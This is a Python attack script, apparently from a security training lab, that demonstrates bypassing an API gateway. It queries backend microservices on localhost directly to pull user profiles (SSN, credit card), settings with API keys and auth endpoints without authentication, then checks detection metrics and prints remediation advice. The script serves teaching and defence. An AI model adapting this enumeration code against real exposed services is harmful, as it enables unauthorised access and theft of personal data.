#!/usr/bin/env python3
"""
Direct Service Access Attack
=============================

VULNERABILITY: Backend services are exposed on public ports without authentication
IMPACT: Attackers can bypass Gateway security controls (WAF, rate limiting, JWT validation)

This script demonstrates:
1. Direct access to user-service (port 8002) bypassing Gateway (port 8080)
2. Direct access to auth-service (port 8000) bypassing Gateway
3. Data exfiltration without any authentication
4. Metrics showing direct access detection

Author: DevSecOps Hacking Lab
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any
import sys


class DirectAccessAttack:
    """Demonstrates gateway bypass by direct service access"""
    
    def __init__(
        self,
        user_service_url: str = "http://localhost:8002",
        auth_service_url: str = "http://localhost:8000",
        gateway_url: str = "http://localhost:8080"
    ):
        self.user_service_url = user_service_url
        self.auth_service_url = auth_service_url
        self.gateway_url = gateway_url
        self.results = {
            "attack_name": "Direct Service Access (Gateway Bypass)",
            "timestamp": datetime.now().isoformat(),
            "attempts": [],
            "success_count": 0,
            "failed_count": 0,
            "data_exfiltrated": []
        }
    
    def banner(self):
        """Print attack banner"""
        print("\n" + "="*70)
        print("🎭 DIRECT SERVICE ACCESS ATTACK - Gateway Bypass")
        print("="*70)
        print(f"Target User Service: {self.user_service_url}")
        print(f"Target Auth Service: {self.auth_service_url}")
        print(f"Bypassing Gateway: {self.gateway_url}")
        print("="*70 + "\n")
    
    def attack_user_profiles(self) -> Dict[str, Any]:
        """
        Attack 1: Access user profiles directly without authentication
        Bypasses: JWT validation, rate limiting, WAF
        """
        print("[*] Attack 1: Accessing user profiles directly...")
        
        attack_result = {
            "attack_type": "Direct Profile Access",
            "target": f"{self.user_service_url}/profile/{{user_id}}",
            "profiles_stolen": []
        }
        
        for user_id in range(1, 5):
            try:
                url = f"{self.user_service_url}/profile/{user_id}"
                print(f"    [>] Accessing {url}")
                
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    profile = response.json()
                    attack_result["profiles_stolen"].append(profile)
                    self.results["data_exfiltrated"].append(profile)
                    self.results["success_count"] += 1
                    
                    print(f"    [✓] SUCCESS - Stolen profile:")
                    print(f"        User: {profile.get('username')}")
                    print(f"        Email: {profile.get('email')}")
                    print(f"        SSN: {profile.get('ssn')} ⚠️ SENSITIVE")
                    print(f"        Credit Card: {profile.get('credit_card')} ⚠️ SENSITIVE")
                else:
                    print(f"    [✗] FAILED - Status: {response.status_code}")
                    self.results["failed_count"] += 1
                    
            except requests.exceptions.RequestException as e:
                print(f"    [✗] ERROR - {e}")
                self.results["failed_count"] += 1
        
        self.results["attempts"].append(attack_result)
        return attack_result
    
    def attack_user_settings(self) -> Dict[str, Any]:
        """
        Attack 2: Access user settings directly without JWT
        Bypasses: JWT validation completely
        """
        print("\n[*] Attack 2: Accessing user settings without JWT...")
        
        attack_result = {
            "attack_type": "Direct Settings Access",
            "target": f"{self.user_service_url}/settings",
            "settings_stolen": []
        }
        
        for user_id in range(1, 5):
            try:
                url = f"{self.user_service_url}/settings?user_id={user_id}"
                print(f"    [>] Accessing {url}")
                
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    settings = response.json()
                    attack_result["settings_stolen"].append(settings)
                    self.results["data_exfiltrated"].append(settings)
                    self.results["success_count"] += 1
                    
                    print(f"    [✓] SUCCESS - Stolen settings:")
                    print(f"        Theme: {settings.get('theme')}")
                    print(f"        API Key: {settings.get('api_key')} 🚨 CRITICAL")
                else:
                    print(f"    [✗] FAILED - Status: {response.status_code}")
                    self.results["failed_count"] += 1
                    
            except requests.exceptions.RequestException as e:
                print(f"    [✗] ERROR - {e}")
                self.results["failed_count"] += 1
        
        self.results["attempts"].append(attack_result)
        return attack_result
    
    def attack_auth_service(self) -> Dict[str, Any]:
        """
        Attack 3: Access auth service endpoints directly
        Bypasses: Rate limiting (can brute force without limits)
        """
        print("\n[*] Attack 3: Testing direct auth service access...")
        
        attack_result = {
            "attack_type": "Direct Auth Access",
            "target": f"{self.auth_service_url}/auth/*",
            "endpoints_tested": []
        }
        
        endpoints = [
            ("/health", "GET"),
            ("/metrics", "GET"),
            ("/auth/login", "POST"),
        ]
        
        for endpoint, method in endpoints:
            try:
                url = f"{self.auth_service_url}{endpoint}"
                print(f"    [>] Testing {method} {url}")
                
                if method == "GET":
                    response = requests.get(url, timeout=5)
                else:
                    # Minimal payload for POST
                    response = requests.post(
                        url,
                        json={"username": "test", "password": "test"},
                        timeout=5
                    )
                
                endpoint_result = {
                    "endpoint": endpoint,
                    "method": method,
                    "status_code": response.status_code,
                    "accessible": response.status_code < 500
                }
                attack_result["endpoints_tested"].append(endpoint_result)
                
                if response.status_code < 500:
                    print(f"    [✓] ACCESSIBLE - Status: {response.status_code}")
                    self.results["success_count"] += 1
                else:
                    print(f"    [✗] NOT ACCESSIBLE - Status: {response.status_code}")
                    self.results["failed_count"] += 1
                    
            except requests.exceptions.RequestException as e:
                print(f"    [✗] ERROR - {e}")
                self.results["failed_count"] += 1
        
        self.results["attempts"].append(attack_result)
        return attack_result
    
    def compare_gateway_vs_direct(self) -> Dict[str, Any]:
        """
        Compare: Request through Gateway vs Direct Access
        Shows security controls bypassed
        """
        print("\n[*] Attack 4: Comparing Gateway vs Direct Access...")
        
        comparison = {
            "attack_type": "Gateway vs Direct Comparison",
            "results": {}
        }
        
        # Test 1: Access profile through gateway (should require auth)
        print("    [>] Test 1: Profile through Gateway (should fail without JWT)")
        try:
            gateway_response = requests.get(
                f"{self.gateway_url}/api/users/profile/1",
                timeout=5
            )
            comparison["results"]["gateway_profile"] = {
                "status_code": gateway_response.status_code,
                "protected": gateway_response.status_code in [401, 403],
                "response": gateway_response.text[:200]
            }
            print(f"        Status: {gateway_response.status_code}")
        except Exception as e:
            comparison["results"]["gateway_profile"] = {"error": str(e)}
        
        # Test 2: Access profile directly (bypasses JWT check)
        print("    [>] Test 2: Profile directly (bypasses security)")
        try:
            direct_response = requests.get(
                f"{self.user_service_url}/profile/1",
                timeout=5
            )
            comparison["results"]["direct_profile"] = {
                "status_code": direct_response.status_code,
                "bypassed": direct_response.status_code == 200,
                "data_leaked": direct_response.status_code == 200
            }
            print(f"        Status: {direct_response.status_code}")
            
            if direct_response.status_code == 200:
                print(f"        🚨 VULNERABILITY CONFIRMED - Security bypassed!")
                self.results["success_count"] += 1
        except Exception as e:
            comparison["results"]["direct_profile"] = {"error": str(e)}
        
        self.results["attempts"].append(comparison)
        return comparison
    
    def check_detection(self):
        """Check if direct access was detected in metrics"""
        print("\n[*] Checking detection metrics...")
        
        try:
            response = requests.get(
                f"{self.user_service_url}/metrics",
                timeout=5
            )
            
            if response.status_code == 200:
                metrics = response.text
                
                # Look for direct access metrics
                if "user_service_direct_access_total" in metrics:
                    print("    [✓] Direct access is being tracked in metrics")
                    
                    # Extract metric values
                    for line in metrics.split('\n'):
                        if 'user_service_direct_access_total{' in line:
                            print(f"        {line}")
                else:
                    print("    [!] No direct access metrics found")
                    
        except Exception as e:
            print(f"    [✗] Could not fetch metrics: {e}")
    
    def generate_report(self) -> str:
        """Generate attack report"""
        print("\n" + "="*70)
        print("📊 ATTACK REPORT")
        print("="*70)
        print(f"Total Attempts: {self.results['success_count'] + self.results['failed_count']}")
        print(f"Successful: {self.results['success_count']}")
        print(f"Failed: {self.results['failed_count']}")
        print(f"Data Items Exfiltrated: {len(self.results['data_exfiltrated'])}")
        print("="*70)
        
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"results/direct_access_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n[✓] Report saved to: {filename}")
        except Exception as e:
            print(f"\n[✗] Could not save report: {e}")
        
        return filename
    
    def run(self):
        """Execute complete attack chain"""
        self.banner()
        
        print("[*] Starting Direct Service Access Attack...\n")
        time.sleep(1)
        
        # Execute attacks
        self.attack_user_profiles()
        time.sleep(0.5)
        
        self.attack_user_settings()
        time.sleep(0.5)
        
        self.attack_auth_service()
        time.sleep(0.5)
        
        self.compare_gateway_vs_direct()
        time.sleep(0.5)
        
        self.check_detection()
        
        # Generate report
        self.generate_report()
        
        print("\n[*] Attack completed!")
        print("\n💡 REMEDIATION:")
        print("   1. Implement mTLS between Gateway and services")
        print("   2. Use internal Docker network (no exposed ports)")
        print("   3. Add service-to-service authentication")
        print("   4. Monitor direct_access_total metrics for anomalies")
        print()


def main():
    """Main entry point"""
    attack = DirectAccessAttack()
    
    try:
        attack.run()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[✗] Attack failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

